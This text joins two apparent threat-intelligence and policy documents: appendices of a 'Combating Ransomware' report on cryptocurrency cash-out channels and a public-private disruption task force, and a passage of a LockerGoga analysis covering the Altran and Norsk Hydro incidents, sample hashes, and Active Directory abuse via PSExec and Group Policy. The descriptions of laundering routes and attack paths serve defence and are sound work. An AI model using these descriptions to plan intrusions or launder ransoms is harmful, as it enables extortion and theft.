cryptocurrency-tracing company \nChainalysis tracked nearly $7 million sent from \nransomware-tainted cryptocurrency wallets to \nother known illicit marketplaces.81 Ransoms \npaid by victims may go on to fund other criminal \nenterprises that are facilitated online, as has \nbeen detailed in other sections of this report. \n\nStep 4 Cash out\nAfter obfuscating the funds, ransomware criminals may make use of the cryptocurrency, or withdraw \nthe funds into cash. There are several methods for cashing out, including over-the -counter trading \ndesks, crypto kiosks, and exchanges, which are the most prominent. Others include exchanging \nbitcoin for gift/debit cards and or alternative coins, such as privacy coins.\n\nAs noted below criminals may make use of cryptocurrency funds by paying for infrastructure to \nconduct attacks or to pay individuals involved in the criminal organization, such as money launderers \nand affiliates. Criminals also rely on OTC traders to convert the virtual currency to fiat. A market \nexists for these OTC transactions because Russian businesses operating in China prefer to operate in \nBitcoin to avoid taxes, while criminals operating in Russia prefer cash. Therefore, an OTC trader can \nconnect these individuals with Russian businesses accepting Bitcoin and criminals receiving cash \ntransactions inside Russia.\n\n2015 2016 2017 2018\n\n4\n\n8\n\n6\n\n2\n\n0\n2019 2020 \n\n$ \nM\n\nIL\nLI\n\nO\nN\n\nS\n\nAppendix B\n\n4\n\n\n\nIST 67Combating Ransomware\n\nCryptocurrency businesses generally fall into one of  \nthree categories:\n\n•\t Regulated Cryptocurrency Exchanges: These are legitimate exchanges with high liquidity \nthat are able to handle a large number of transactions. In the United States, these exchanges \nare subject to non-bank financial institution anti-money laundering (AML) regulations, which \nrequire some Know Your Customer (KYC) identification of customers performing large \ntransactions, among other requirements. Other jurisdictions impose similar KYC and AML \nrequirements as those in the United States, including the United Kingdom, the European Union, \nJapan, Australia and New Zealand.82 \n\n•\t Minimally Regulated Cryptocurrency Exchanges: Located in jurisdictions with less \nstringent regulatory obligations than the United States and other members of the G7, these \ncryptocurrency exchanges operate with few controls for identifying potential illicit funds. These \nexchanges often serve as one of the preferred services for ransomware criminals to cash out \nillicit funds without oversight. These exchanges include Binance and Huobi, which have much \nless stringent KYC rules, especially when dealing with OTC traders.\n\n•\t Peer-to-Peer (P2P) Cryptocurrency Exchanges (also known as Over-the-Counter or \nDecentralized Exchanges): Regardless of geographical limits, users can download freely-\navailable software or access P2P exchanges to buy and sell cryptocurrency directly with one \nanother. This avoids the use of a third-party service like a “traditional” exchange, which may \nhold user funds in custody, process transactions in fiat currency, and comply with KYC and \nAML requirements. \n\n•\t Over-The-Counter Trading Desks: Some OTC traders, actors that trade cryptocurrency \nwithout an exchange acting as a facilitator or mediator of the trade, provide cryptocurrency \nlaundering services to ransomware threat actors. Although many OTC traders maintain \nlegitimate businesses and comply with stringent financial regulations, some do not, and they \nprovide an important source of liquidity for exchanging ransomware payment. \n\nTracking payments is difficult due to the variance in standards and enforcement of regulation \nfor exchanges of different categories, or that operate in different countries. Even using regulated \nexchanges, ransomware actors constantly find new ways to remain hidden by using money mule \nservice providers to set up accounts, or use accounts with false or stolen credentials.\n\nStep 4 \ncont...\n\nCryptocurrency businesses facilitate the trading of cryptocurrency between buyers and sellers. \nRansomware criminals rely on these businesses to exchange their ransomware proceeds for \ndifferent cryptocurrencies or for government-issued currencies. As relatively new financial \ninstitutions, these cryptocurrency businesses exist on a spectrum of legitimacy, regulation, and \ncompliance, and handle varying amounts of transactions with illicit funds. For example, in 2019, \nCoinbase published a report identifying that most exchanges are not in compliance with Anti \nMoney Laundering or Know your Customer procedures.\n\nAppendix B\n\n\n\nIST 68Combating Ransomware\n\nBackground \n\nOver the years, many efforts have attempted to formalize the trust networks that are relied on \nto keep the internet operating. Some initiatives have been effective without significant formal \nstructure: the Conficker Working Group, convened by Microsoft in the late 2000s to stop the spread \nand impact of the Conficker worm, is often lauded as an early model. More formal joint collaborative \nefforts have also been successful: the 2020-2021 takedown of Emotet was an example of a long \ncollaborative effort between global law enforcement, judicial authorities, and private industry to \nseize and disrupt a massive global botnet. More often, though, public-private information security \ncollaboration occurs primarily when there is a crisis, as was the case with the Cyber Unified \nCoordination Group (UCG), which the U.S. Government convened in 2021 to focus on the Hafnium \ncase involving vulnerable Microsoft Exchange Servers.\n\nWhat remains elusive is a standing mechanism for convening operationally focused, sustained, \npublic-private campaigns that are coordinated via formal and informal nodes, and that allow for \nboth the formal requirements needed by government and the informal requirements needed by \nindustry. Much has already been written about potential solutions for launching such an initiative, \nincluding Jay Healey’s 2018 article on Cyber Incident Collaboration Organizations,83 recent work by \nthe Aspen Institute,84 and recommended solutions from the World Economic Forum’s Partnership \nAgainst Cybercrime.85 Ransomware presents a unique opportunity to test new approaches, and the \nRansomware Task Force provides below a proposed framework for consideration. \n\nObjective\n\nUse operational collaboration to increase the scope, scale, pace, and efficacy of intelligence-driven \ntakedowns and disruption of ransomware operations and the infrastructure and people that enable them. \n\nAppendix C:  \nProposed Framework for a Public-Private \nOperational Ransomware Campaign\n\nThis appendix provides an overview of how the \nformal, government-led Joint Ransomware Task \nForce (JRTF) and the informal Ransomware Threat \nFocus Hub (RTFH) could collaborate to conduct an \noperational ransomware campaign. \n\nAppendix C\n\n\n\nIST 69Combating Ransomware\n\nAssumptions\n\nRansomware actors are intelligently taking advantage of the seams between law enforcement \nand private-sector cooperation mechanisms, and between governmental and private-sector legal \nauthorities. They also move with such alacrity that existing structures cannot respond fast enough \nto disrupt their activities on a sustained, rapid, and concerted basis. \n\nExisting mechanisms are working to address the problem, but they are siloed in various agencies and \nnot leveraging the full authorities and capabilities of all government agencies. They also do not routinely \nincorporate private-sector action, nor do they scale to compete with the agility of the criminals.\n\nThis public-private operational collaboration mechanism should include actors and organizations \nthat are involved in the full gamut of defending against and disrupting ransomware operations. No \nsingle actor or entity is fully capable of disrupting this threat by itself, so public and private actors \nmust come together to assess the threat and coordinate activities across authorities and capabilities. \n\nA natural governmental response to this collaboration requirement is to create some kind of formal \nstructure. However, a formal private-public Joint Ransomware Task Force would likely hinder private-\nsector participation. Past experience has shown that private-sector participants are more likely to \nshare information with the government and take actions to defend their customers in coordination \nwith government through existing informal and indirect channels. The U.S. Government, on the other \nhand, needs formality to function in a joint way; moreover, the need for public accountability requires \nthe government to adhere to formal rules and structures. Departments and agencies, especially those \nwith competing equities, are more likely to work only within their lane of authorities and capabilities \nunless they are required and incentivized to work with each other. \n\nThus a formal government task force paired with existing formal and informal private-sector groups \nin the short-term would build trust and work to develop some early wins. Over time, a combination of \nformal and informal private-sector structures should develop to interface with the government’s Joint \nRansomware Task Force (JRTF), working toward a 24/7 operational collaboration mechanism for a \npublic-private anti-ransomware campaign.\n\nRansomware disruptions will almost always be law enforcement operations at their core. But in \norder to truly disrupt ransomware actors, we must also consider non-law enforcement options and \ncapabilities that can improve defenses, impose costs, or more fully disrupt ransomware operations. \nIn terms of the intelligence needed for such operations, the government and various private-sector \norganizations need each other.\n\nAppendix C\n\nPrivate-sector participants must recognize \nthat not all government actions will be shared \nor coordinated with non-government actors \ndue to security concerns or to protect sources \nand methods.\n\nGovernment participants must recognize that \nprivate-sector participants may need to take \nactions quickly to protect their customers \nand fulfill contractual agreements, and may \nnot always be able to coordinate actions with \nthe government.\n\n\n\nIST 70Combating Ransomware\n\nU.S. Government personnel working with the private sector in a given campaign must be \nempowered and incentivized by their leadership to engage with the private sector and take \naction based on what they learn. They should also anticipate the needs of private-sector \npartners and share information that will lead to disruptions. \n\nTo achieve this increased level of operational collaboration, the Ransomware Task Force \nrecommends the following:\n\n•\t Private-sector cybersecurity providers are often best positioned to capture indicators of \ncompromise and tactics, techniques, and procedures (TTPs) of the malicious actors to \ndevelop protections for their customers and understand active campaigns. \n\n•\t Cryptocurrency exchanges and analysis firms are best positioned to understand  \nthe flow of ransomware payments. \n\n•\t Government agencies, especially in law enforcement and the Intelligence Community, are \nbest positioned to identify the individuals behind the activity. \n\n•\t All of these intelligence perspectives must be shared, combined, and understood in order to \ndevelop the best possible disruption options.\n\nOver time, a combination of formal and \ninformal private sector structures should \ndevelop to interface with the government’s \nJoint Ransomware Task Force, working \ntowards a 24/7 operational collaboration \nmechanism for a public-private anti-\nransomware campaign. \n\nAppendix C\n\n\n\nIST 71Combating Ransomware\n\nRecommendations\n\n1.\t The U.S. Government should establish the Joint Ransomware Task Force (JRTF) consisting of \nrepresentatives from the Cybersecurity and Infrastructure Security Agency (CISA; the FBI; United \nStates Secret Service; the Intelligence Community; U.S. Cyber Command; the Departments of \nTreasury, Justice, and State; the Office of the National Cyber Director; and other departments \nand agencies as appropriate. The JRTF’s mission should be to prioritize ransomware disruption \noperations and leverage the intelligence-driven disruption planning process to increase the pace \nand efficacy of ransomware takedowns and disruption. The Departments of Homeland Security, \nJustice, and Defense should jointly provide the resources needed to establish and operate the \nTask Force, such as office space, IT infrastructure, and other supplies. The Task Force should \ncoordinate closely with the Joint Cyber Planning Office in CISA, the National Cyber Investigative \nJoint Task Force (NCIJTF), and other inter-agency cyber-related groups. The NSC-led Interagency \nWorking Group recommended in 1.2.1 of the main RTF report would provide direction, priorities, \nand oversee the JRTF. The goals of the JRTF should be to: \n\n•\t Prioritize intelligence-driven operations to disrupt specific ransomware actors; \n•\t� Incentivize and empower government agencies and personnel to participate in joint \n\noperations in the interagency and with private-sector partners and take action; and\n• \t Anticipate the needs and requests of the private sector \n\n\t� The Administration could create such a Task Force through executive action, just as the Bush \nAdministration created the NCIJTF through National Security Policy Directive-54/Homeland \nSecurity Policy Directive-23. The JRTF could be a stand-alone entity, or as U.S. government cyber \norganizations continue to mature and evolve, it could be folded into an existing organization, such \nas the Joint Cyber Planning Office, the National Cyber Director’s office, or the NCIJTF. \n\n2.\t An existing non-profit organization should establish a private-sector Ransomware Threat Focus \nHub. The participants should include cybersecurity providers, non-profit sharing organizations, \ncyber threat intelligence firms, threat intelligence researchers and contractors, incident response \nfirms, managed security service providers, telecommunications companies, major platform owners/\noperators, and hosting providers. The Hub would facilitate and coordinate sustained private-sector \nactions against an agreed-upon target list, in coordination with the JRTF. The hosting non-profit \norganization, such as an information-sharing and analysis organization (ISAO), would provide space \nfor information sharing and operational collaboration between participants.86 Formal and informal \ncoordination could occur within this Hub, and the Hub would encourage informal and formal groups \nto work together in tandem.

Throughout the \nevolution and spread of ransomware, events have shifted from focused targeting, to \nnear indiscriminate wormable propagation, to “big game hunting” of large enterprises \nthrough widespread compromise. Underneath these trends, a space has developed \nwhere state-sponsored, as opposed to criminal, elements can weaponize ransom-\nware (or ransomware-like) functionality. \n\nBeginning with a clumsy monetization effort by North Korea through WannaCry, \nransomware-as-disruptor seemed to establish itself with the NotPetya event taking \nplace only a few months later in 2017. Yet this event, while significantly disruptive \nand harmful, showed immaturity by being too obviously related to disruptive inten-\ntions as opposed to financial gain. \n\nA new version of the LockerGoga ransomware impacted Norsk Hydro later. While \nsuperficially similar to other industrial-targeted ransomware events around the \nsame time, the Hydro event incorporated unique disruptive characteristics calling \ninto question whether the attackers ever intended to decrypt systems after infection. \n\nNevertheless, insufficient data exists to adequately disposition Hydro as a state-spon-\nsored disruption event instead of a financially motivated criminal exercise. Given \npoor public-private information sharing due to mistrust and similar friction, com-\nbined with perverse financial incentives from lawsuits through denied insurance \nclaims, victims have little reason to come forward with necessary data to disposition \ndisruptive events between criminal ransomware and likely state-sponsored disrup-\ntion. Only by resolving these issues and providing political and financial security to \nvictims will governments be able to muster not only the cooperation, but even the \ninformation necessary to identify such threats – let alone combat them. \n\nEXECUTIVE\nS U M M A RY\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n2\n\n\n\nCONTENT\nEXECUTIVE SUMMARY �  2\n\nINTRODUCTION�  4\n\nREVIEW OF LOCKERGOGA�  6\n\nTHE NORSK HYDRO INCIDENT �  9\n\nE VENT CHAR ACTERISTICS AND AT TACK PATH� 10\n\nLOCKERGOGA FUNCTIONALIT Y DIFFERENCES IN NORSK HYDRO� 12\n\nPOSSIBLE ADDITIONAL VICTIMS AND WIDER E VENT TARGETING� 14\n\nNORSK HYDRO, LOCKERGOGA, AND FIN6� 16\n\nLOCKERGOGA SINCE NORSK HYDRO� 17\n\nLOCKERGOGA AND MEGACORTEX� 19\n\nRANDOMWARE AS DISRUPTIVE CAPABILITY�  21\n\nNOTPET YA AS R ANSOMWARE-LIKE DESTRUCTIVE AT TACK � 22\n\nNOTPET YA LESSONS LE ARNED AND AT TACKER E VOLUTION� 23\n\nINFORMATION OPERATIONS AND DISRUPTIVE IMPLICATIONS OF \nREPURPOSED RANSOMWARE �  26\n\nDENIABLE OPER ATIONS BY MIMICKING CRIMINAL ACTIVIT Y � 27\n\nVICTIM REPORTING CONCERNS WITH POSSIBLE STATE-SPONSORED \nINVOLVEMENT� 28\n\nCONCLUSIONS �  30\n\nAPPENDICES�  32\n\nAPPENDIX A: LOCKERGOGA SAMPLES � 32\n\nAPPENDIX B: APPROXIMATE R ANSOMWARE TIMELINE� 34\n\n3\n\n\n\nRansomware has a surprisingly long \nhistory in information security, with the \nfirst publicly known instance being a \nfloppy disk-distributed worm provided \nto AIDS researchers at a World Health \nOrganization conference in 1989.1 \n\nAfter a lull with some periods of identified activity, like the GPCode virus,2 ransomware \nreturned to focus with the emergence of CryptoLocker in 2013.3 In the years since, \nransomware has rapidly proliferated, with over 20 distinct families emerging between \n2013 and 2016.4 In that time, ransomware grew into one of the most disruptive and \nfinancially-damaging types of computer security events, resulting in not only increas-\ning financial costs but also availability impacts often lasting weeks or months during \nrecovery operations.5\n\nA turning point in ransomware arrived in 2017 with the WannaCry outbreak.6 While \nunprecedented for the sheer speed with which it spread around the globe on release, \nWannaCry is also interesting as it subsequently proved the ransomware was not the \nwork of ordinary criminal, extortion-minded entities. Instead, WannaCry’s origins lay \nwith state-sponsored cyber activity, specifically entities working on behalf of the Dem-\nocratic People’s Republic of Korea (DPRK).7 Although featuring several functionality \nissues in terms of recovery following a ransom payment,8 WannaCry at least appeared \nto be designed as a vast monetization scheme in support of DPRK interests – a “first” \ngiven available information. \n\nRansomware moved from a primarily criminal problem to one suddenly involving \nstate-sponsored activity. Such shifts became even more apparent a few months later \nwhen what initially appeared to be a variant of Petya ransomware swept across the \nglobe with even greater disruption than WannaCry.9 Subsequent investigation, includ-\ning government-sponsored reporting, identified the malware, now known as NotPetya, \nas a wiper masquerading as ransomware with the intention of causing massive, unre-\ncoverable disruption on victim IT systems.10\n\nINTRODUCTION\n\n4\n\n\n\nThe following analysis relies almost entirely on publicly available reporting and analysis, \nwith only a few exceptions that were sourced from multiple entities. As a result, some \nentities may disagree with analysis or details as a result of having additional, non-pub-\nlic and undisclosed information on events below. Organizations or entities possessing \ndata that can significantly alter or dispute the below analysis are strongly encouraged \nto make available any relevant data to ensure greater accuracy. Since initial coverage \nof LockerGoga in general and the Norsk Hydro event in particular, few parties have \nmade any substantial new information available beyond scattered media interviews and \nhigh-level conference talks, which are all included below.\n\nA NOTE ON METHODOLOGY\n\nSince the WannaCry and NotPetya events of 2017, ransomware has continued to rage global-\nly, impacting entities including government agencies, schools, hospitals, and large corporations. \nHowever, the events of 2017 should not be lost even as an ever-greater number of ransomware \nvariants emerge to hold networks hostage for payment. While continued ransomware events indi-\ncate monetary success for criminal entities, the two largest outbreaks recorded demonstrate a \nplaybook for non-criminal actors. Ransomware’s disruptive capacity combined with its ubiquity \nmay provide state-sponsored or -controlled entities with a unique, deniable tool to achieve large-\nscale network disruption.\n\nNotPetya’s functionality, as described by multiple researchers, made it apparent the malware ulti-\nmately served as a “wiper”, functionally destroying infected machines rather than a true ransomware \nvariant where decryption and recovery is (presumably) possible. NotPetya’s indiscriminate spread, \nbeginning with a supply chain compromise at an accounting software company serving Ukraine \nthen encompassing entities worldwide,11 resulted in impacts likely far beyond the responsible enti-\nty’s desires – including significant impacts in Russia, believed by multiple government and private \nentities to be the likely source of the malware. An adversary paying attention to these events, as \nwell as following the evolution of “typical” ransomware since 2017, could therefore design a less \nvirulent infection method enabling greater control over propagation while avoiding the obviously \ndestructive aspects of NotPetya to embrace legitimate encryption operations. An entity with no \nintention of ever providing or revealing a key can achieve the same functional goal of rendering \nvictim machines unusable and data unrecoverable. \n\nG I V E N  T H E  C O N T I N U E D  W I D E S P R E A D ,  D I S R U P T I V E  N A T U R E  O F \nC R I M I N A L  R A N S O M W A R E  A T  T H E  T I M E  O F  T H I S  W R I T I N G ,  A C C U -\nR A T E L Y  A N D  C O N F I D E N T L Y  D E T E C T I N G  S U C H  A  W E A P O N I Z A T I O N \nO F  R A N S O M W A R E  W O U L D  P R O V E  D I F F I C U L T  I F  I T  O C C U R R E D ,  I F \nN O T  O U T R I G H T  I M P O S S I B L E .\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n5\n\n\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nLOCKERGOGA\nLockerGoga first emerged in January 2019 with a \nransomware event at French engineering company \nAltran Technologies.12 \n\nSubsequent reporting from the French government confirmed that LockerGoga was responsi-\nble for the event, while ensuing CERT-FR reporting added additional details.13 Unlike many other \nransomware variants that possessed some built-in mechanism for self-spreading, LockerGoga \ncontained no such propagation features whatsoever.\n\nTable 1: Probable Altran-Related LockerGoga Samples\n\nSHA256 SIZE COMPILE \nTIME\n\nFIRST \nOBSERVED \nCOUNTRY\n\nFILE \nNAME SIGNED SIGNER\n\nPOS-\nSIBLE \nEVENT\n\nFUNCTION-\nALITY\n\n14E8A8095426245633CD6C3440AF-\nC5B29D0C8CD4ACEFD10E16F82EB-\n3295077CA\n\n1.21 MB 1/28/2019 \n18:13 ES WORK-\n\nER32\nMIKL \n\nLIMITED\nCOMODO \n\nRSA ALTRAN ENCRYPT \nONLY\n\n6E69548B1AE61D951452B65D-\nB15716A5EE2F9373BE05011E897C-\n61118C239A77\n\n1.21 MB 1/25/2019 \n16:30 NL WORK-\n\nER32\nMIKL \n\nLIMITED\nCOMODO \n\nRSA ALTRAN ENCRYPT \nONLY\n\nBDF36127817413F625D-\n2625D3133760AF724D6AD-\n2410BEA7297DDC116ABC268F\n\n1.21 MB 1/23/2019 \n22:42 RO WORK-\n\nER32\nMIKL \n\nLIMITED\nCOMODO \n\nRSA ALTRAN ENCRYPT \nONLY\n\n8CFBD38855D2D6033847142FD-\nFA74710B796DAF465AB94216FBB-\nBE85971AEE29\n\n1.22 MB 1/16/2019 \n19:27 NL WORK-\n\nER32\nMIKL \n\nLIMITED\nCOMODO \n\nRSA ALTRAN ENCRYPT \nONLY\n\n5B0B972713CD8611B-\n04E4673676CDFF70345AC7301B2C-\n23173CDFEAFF564225C\n\n1.22 MB 1/16/2019 \n1:23 RO WORK-\n\nER32\nMIKL \n\nLIMITED\nCOMODO \n\nRSA ALTRAN ENCRYPT \nONLY\n\nR E V I E W O F\n\n6\n\n\n\nInstead of introducing a self-propagating file \ninto the network, the Altran incident involved \nan extensive, interactive breach by an unknown \nentity leveraging publicly and commercially \navailable tools, such as Metasploit, PowerShell \nEmpire, Cobalt Strike, and PSExec, to move \nlaterally through the network. As stated in \nCERT-FR reporting, “Cette exécution est réal-\nisée plusieurs semaines (voire plusieurs mois) \naprès la compromission effective de la cible” \n– essentially, the attackers were in the net-\nwork weeks or months prior to the execution \nof LockerGoga to prepare for and enable the \nransomware event. While a precise mechanism \nfor distribution was not identified, a combina-\ntion of scripts and interactive logons appeared \nto disable security tools and prepare for the \nransomware execution within the environment.\n\nThis first sample of LockerGoga associated \nwith a publicly known incident is interesting for \nseveral reasons. First, it is signed with a likely \nfraudulent code signing certificate issued by \nCOMODO (now Sectigo).14 Although not unique \n\nfor malware, signed binaries can assist in \nevading security products or operating system \ncontrols for execution. Second, LockerGoga \nuses the Boost C++ libraries for multiple pur-\nposes, including for file renaming, parent-child \nprocess communication, and file deletion rou-\ntines.15 Third, actual encryption routines rely \non another publicly-available C++ library called \nCrypto++ instead of native Windows libraries or \ncoded encryption routines.16 Fourth, after initial \nexecution on a victim host, multiple “worker” \ninstances of the malware are launched which \nthen encrypt files on the host machine. This \nis a cumbersome and high-overhead process, \nbut also one where failure to stop or kill the \n“root” process means defensive software or \ninteractive use will likely fail to halt the encryp-\ntion routine. Of note given likely spreading \nand installation methodology, the parent-child \nencryption process, which takes more time \nthan other mechanisms, is ideally suited to \nan infection pushed or scheduled after typical \nworking hours like a malicious group policy \nchange or widely-scripted execution event.\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n7\n\n\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nBased on binary strings, encryption appears to target a standard list of document and related file \ntypes ranging from Microsoft Office Word documents to PDF files. However, in practice, Locker-\nGoga encrypts all files outside Program Files and operating system directories. The ransomware \nnote that provides contact instructions to negotiate payment is written last. An overview of Lock-\nerGoga’s behavior and execution sequence can be found in Figure 1.\n\nFigure 1: LockerGoga process flow\n\nThe network decryption and negotiation approach represents a slight shift in ransomware, also \nobserved in Ryuk and later ransomware variants. Attackers can work to hold an entire network \nhostage, negotiating for decryption of the entire victim space, rather than providing per-host \ndecryption instructions through a set price and reference to a Bitcoin or related cryptocurren-\ncy wallet. LockerGoga (along with the contemporaneous ransomware variant Ryuk) appeared to \ninaugurate an enterprise-targeting shift within ransomware. Items such as payment instructions \nor a wallet ID for cryptocurrency are unnecessary because victims negotiate to unlock their entire \nnetwork with the attackers.\n\nLockerGoga \nExecutes\n\nRemoves tself from disk, \nlaunches child \n\nprocesses\n\nEncrypts files, binaries, \netc. outside of \n\n%System% \ndirectory\n\nWrites ransom note with \ncommunication \n\ninstructions after \nencryption \ncomplete\n\n8\n\n\n\nT H E N O R S K\n\nHYDRO \nINCIDENT\nFollowing events at Altran, \nthere were no recorded or \npublic sightings of LockerGoga \nuntil 19 March 2019 when \nNorwegian power and \naluminum company, Norsk \nHydro, faced a crippling cyber \nattack.17 \n\nBased on public reporting and continued company updates, \nHydro was able to resume reduced operations by placing \nimpacted industrial and production systems in manual \noperations mode. Hydro reporting did not provide any tech-\nnical observations or if the attack constituted a ransomware \nevent. Subsequent analysis of publicly available informa-\ntion and sample correlation to company statements later \nindicated the event was the work of LockerGoga, but was a \nvariant that featured additional functionality not observed \nin previous versions.\n\n9\n\n\n\nEVENT CHARACTERISTICS \nAND ATTACK PATH\n\nPrecisely how the unknown attackers managed \nthis level of penetration was unclear until fol-\nlow-on reporting in the summer of 2019 from \nmultiple media outlets. It was then revealed \nthat Hydro was initially breached via phishing. \nUnknown entities managed to spoof legitimate \ncommunication with a Hydro customer and \nused this to deliver a malicious attachment \nmatching expected communication with Hydro \nitself.20 Although superficially similar to tech-\nniques such as Business Email Compromise \n\n(BEC), the additional inclusion of what is \ndescribed as a forged or modified legitimate \ndocument matching expected communication \nappears different from known BEC activity. \nAdequately dispositioning and evaluating the \nphishing vector is not possible due to a lack \nof technical details and further information. \nSubsequent actions resulted not in the attack-\ner attempting to prompt a wire transfer, but to \nworm their way into Hydro’s network to gain \ncomplete control of the AD environment. \n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nT H E  F I R S T  D E T A I L E D  R E P O R T I N G  O N  T H E  H Y D R O  E V E N T  C A M E \nV I A  I N D E P E N D E N T  S E C U R I T Y  R E S E A R C H E R S ,  M O S T  N O T A B L Y  A \nL E N G T H Y  O V E R V I E W  F R O M  K E V I N  B E A U M O N T . 1 8 \n\nFollow-on reporting from the Norwegian CERT indicated LockerGoga spread and execution was \nenabled by a widespread compromise of Hydro’s Windows Active Directory (AD) instance.19 With \nthis level of compromise, attackers have access and control over the victim’s Windows envi-\nronment, enabling a host of options including the placement and timing of malware execution \nthroughout the enterprise. Examples of this timing are provided in Figure 2.\n\nFigure 2: Active Directory Compromise Options\n\nAD compromise enables attacker \nto dump all passwords in the \nenvironment.\n\nAttacker is able to facilitate \nunlimited pivoting as a legitimate \nuser.\n\nPSExec plus NET commands can \nbe used to move and execute \nmalware via script.\n\nThis works in conjunction with, \nand is enabled by, credential \ncapture.\n\nThis creates a malicious binary \nor script for deployment via \nGroup Policy Object (GPO).\n\nGPO can be pushed manually or \nscheduled for a specfiic time.\n\nCREDENTIAL\nACCESS\n\nREMOTE PROCESS\nEXECUTION\n\nACTIVE \nDIRECTORY ABUSE\n\n10\n\n\n\nAlthough an official time-estimate of how far in advance Hydro was breached before the LockerGo-\nga incident is unknown, estimates range from weeks to months.21 Previous LockerGoga incidents \nare alleged to have involved extensive use of tools such as Metasploit and Cobalt Strike for lateral \nmovement,22 but no public evidence emerged from the Hydro event to support this claim. Some \nstatements and conference discussions indicated possible use of Cobalt Strike, but no additional \ntechnical details were provided or are available. Later discussions with several sources indicated \nthe attacker may have used a then-zero day, CVE-2019-0859, as a privilege escalation mechanism \nto enable penetration of the Hydro environment.23 The attackers were able to widely distribute \nLockerGoga on Windows terminals throughout Hydro for coordinated execution, potentially via a \nmalicious Group Policy Object push, to copy and execute the malware on 19 March 2019.\n\nFigure 3: Norsk Hydro LockerGoga Variant Ransom Note\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n11\n\n\n\nLOCKERGOGA FUNCTIONALITY \nDIFFERENCES IN NORSK HYDRO\n\nWhile the above is superficially similar to how Altran was likely breached and matches subsequent \nreporting on other ransomware families distributed via interactive compromise of a victim’s AD \ninfrastructure,24 other elements of the Hydro event were different than seen before. Initially not-\ned by researchers at Cisco Talos, the LockerGoga variant most-likely associated with events at \nHydro features additional functionality not found in previous variants,25 either those identified at \npublicly known incidents or additional samples retrieved from commercial databases of malware \nsamples.26\n\nTable 2: Probable Norsk Hydro Related LockerGoga Samples\n\nSHA256 SIZE COMPILE \nTIME\n\nFIRST \nOBSERVED \nCOUNTRY\n\nFILE \nNAME SIGNED SIGNER\n\nPOS-\nSIBLE \nEVENT\n\nFUNCTIONALITY\n\n65D5DD067E5550867B-\n532F4E52AF47B320BD31B- 1.21 MB 3/18.2019 \n\n9:07 NO TGYTUTRC ALISA SECTIGO NORSK \nHYDRO\n\nENCRYPT, CHANGE \nACCOUNT PASS-\n\nWORDS, DIS-\nABLE NETWORK \n\nADAPTER\n\n88D149F3E47DC337695D-\n76DA52B25660E3A454768AF-\n0D7E59C913995AF496A0F\n\n1.21 MB 3/18.2019 \n9:07 NO TGYTUTRC ALISA SECTIGO NORSK \n\nHYDRO\n\nENCRYPT, CHANGE \nACCOUNT PASS-\n\nWORDS, DIS-\nABLE NETWORK \n\nADAPTER\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\n12\n\n\n\nLockerGoga \nExecutes\n\nRemoves tself from disk, \nlaunches child \n\nprocesses\n\nLogs o� all logged-in \nusers\n\nDisables system network \ncard\n\nChanges local user and \nadministrator \n\npasswords\n\nEncrypts files, binaries, \netc. outside of \n\n%System% \ndirectory\n\nWrites ransom note with \ncommunication \n\ninstructions after \nencryption \ncomplete\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nLockerGoga samples outside of those associated with Hydro followed the same functionality as the \nsamples associated with the Altran event described earlier, focusing on file encryption using multi-\nple processes. The samples associated with Hydro add significant new and disruptive functionality \ndescribed below:\n\nAs noted by researchers at Talos, the above adds not only significantly more disruptive aspects to the \nevent but appears also to work at cross-purposes to monetize the infection. The above chain of events \nmeans that systems were not only encrypted, but become inaccessible given changed local passwords \nand lack of network connectivity for remote and domain logons. In this scenario, even viewing the \nransom note associated with the event would require additional work, such as forensically imaging the \nmachine to recover the note from disk or analyzing the malware. This is especially true given that the \nransom note was written at the end of the encryption process, just before local and remote access to \nthe host was removed. While viewing ransom information is certainly possible, such items seem curi-\nous and counterproductive for efficient monetization.\n\nFigure 4: LockerGoga Execution Sequence, Norsk Hydro Variant\n\nOne possibility based on reporting and available information is that multiple samples of LockerGoga \nwere present in the Hydro environment. Multiple media reports and Hydro press releases included cop-\nies of the ransom note dropped by the more disruptive samples indicating these had to be recovered \nsomehow. Multiple versions of LockerGoga may have been active in the Hydro environment simultane-\nously, including variants similar to the previous types performing encrypt-only operations.\n\nIrrespective of the above multiple variant possibility, reporting on Hydro recovery efforts included a quote \nfrom company personnel about the desire to detect rapid password changes in the environment using an \nunspecified artificial intelligence solution after the LockerGoga event.27 Based on this observation, a reasonable \nconclusion is that at minimum the more-disruptive LockerGoga variant was definitely active in Hydro’s network.\n\nLocal user account passwords were \nchanged to a hard-coded value.\nLocal administrator account passwords were \nchanged to the same hard-coded value.\n\nThe system network card was \ndisabled.\nAll logged-in users to a machine \nwere forcibly logged off.\n\n13\n\n\n\nSPYWARE STEALER LOCKER WIPER: LOCKERGOGA REVISITED \n\nwith the disruptive LockerGoga \nvariant. Specific timing of any \nfollow-on attacks and ques-\ntions surrounding subsequent \nactivities planned together or \nseparate from events at Hydro \nare also lacking.\n\nThe fact that ransomware \ninfections are on the rise and \nincreasingly disruptive is no \nsurprise. Subsequent media \nreporting indicates multiple \nefforts in the European Union to \nidentify and prosecute entities \nresponsible for recent ransom-\nware events against multiple \nindustrial institutions.31 The \npossibility the disruptive vari-\nant of LockerGoga was used \nspecifically against multi-\nple Norwegian businesses \nroughly simultaneously with \nthe Hydro event is concern-\ning. First, such intrusions are \nrelatively labor-intensive and \nrequire entities to compromise \nentire networks to achieve full \nAD compromise for malware \ndistribution. This indicates a \nwell-resourced team able to \nexecute multiple compromis-\nes simultaneously. \n\none would expect a criminal \ngang intent on monetizing \nits ransomware capability to \ncontinue activity, subsequent \ndetails on timing and possible \ngeographic focus made cir-\ncumstances appear different. \nNorwegian reporting indicated \nthat multiple Norwegian com-\npanies were targeted by the \nsame entity responsible for \nthe Hydro event, and that these \nentities were able to thwart the \nattackers based on quick infor-\nmation sharing from Hydro \nwith Norwegian authorities.30 \nPress reporting is unclear as \nto whether entities outside \nNorway were also targeted \n\nFirst and immediately obvious, \nthe attack itself took place the \nday after Hydro announced \nits existing CEO was stepping \ndown to be replaced by an 